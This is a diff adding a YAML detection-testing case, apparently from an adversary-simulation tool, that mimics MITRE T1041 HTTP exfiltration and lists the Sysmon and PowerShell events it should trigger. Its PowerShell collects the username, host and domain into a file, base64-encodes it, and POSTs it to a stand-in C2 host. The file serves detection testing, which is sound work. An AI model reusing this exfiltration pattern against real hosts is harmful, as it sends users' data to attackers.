@@ -1,0 +1,50 @@
+id: T1041
+name: Exfiltration Over C2 Channel (HTTP)
+description: Simulates HTTP data exfiltration — creates a synthetic data file, base64-encodes it, and POSTs it via Invoke-WebRequest to a non-existent endpoint. Generates Sysmon EID 3 (outbound HTTP from PowerShell) and EID 4104 (ScriptBlock with base64+Invoke-WebRequest). The combination of base64 encoding + HTTP POST from powershell.exe is a tier-1 DLP/proxy/NDR detection rule.
+tactic: exfiltration
+technique_id: T1041
+platform: windows
+phase: attack
+elevation_required: false
+nist_controls:
+  - SC-7
+  - SI-4
+  - AC-3
+  - AU-12
+expected_events:
+  - "Sysmon 3 (NetworkConnect — outbound HTTP from PowerShell to external host)"
+  - "4104 (PowerShell ScriptBlock — Invoke-WebRequest, base64 encoding, ConvertTo-Json)"
+  - "Sysmon 22 (DNSEvent — DNS query for exfil target)"
+  - "Proxy/firewall log — HTTP POST with large base64 body"
+tags:
+  - exfiltration
+  - no-prereqs
+executor:
+  type: powershell
+  command: |-
+    Write-Host "[T1041] Exfiltration Over C2 Channel — HTTP POST simulation"
+    $tmpFile = "$env:TEMP\lnj_exfil_data.txt"
+
+    # Create synthetic sensitive-looking data file
+    $data = "LOGNOJUTSU_SIMULATION_EXFIL_TEST`r`nUser: $env:USERNAME`r`nHost: $env:COMPUTERNAME`r`nDomain: $env:USERDOMAIN`r`nDate: $(Get-Date -Format 'o')`r`nData: $(Get-Random -Minimum 100000 -Maximum 999999)"
+    [System.IO.File]::WriteAllText($tmpFile, $data)
+    Write-Host "Synthetic data file created ($($data.Length) bytes): $tmpFile"
+
+    # Base64 encode payload (common exfil obfuscation — EID 4104 captures this)
+    $encoded = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($tmpFile))
+    Write-Host "Base64-encoded payload: $($encoded.Length) chars"
+
+    # Attempt HTTP POST to non-existent target (Sysmon EID 3 fires on connect attempt)
+    Write-Host "--- HTTP POST exfiltration attempt (Sysmon EID 3 generated) ---"
+    try {
+        $body = @{ host = $env:COMPUTERNAME; data = $encoded } | ConvertTo-Json
+        Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/collect" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 3 -ErrorAction Stop
+    } catch {
+        Write-Host "Connection failed as expected (target non-existent): $($_.Exception.Message)"
+        Write-Host "Sysmon EID 3 + DNS EID 22 generated for connection attempt regardless."
+    }
+
+    Write-Host "[T1041] Complete. Check Sysmon EID 3 for outbound HTTP; EID 4104 for base64+Invoke-WebRequest."
+cleanup: |-
+  Remove-Item "$env:TEMP\lnj_exfil_data.txt" -ErrorAction Ignore
+  Write-Host "Cleanup: Exfil test file removed."
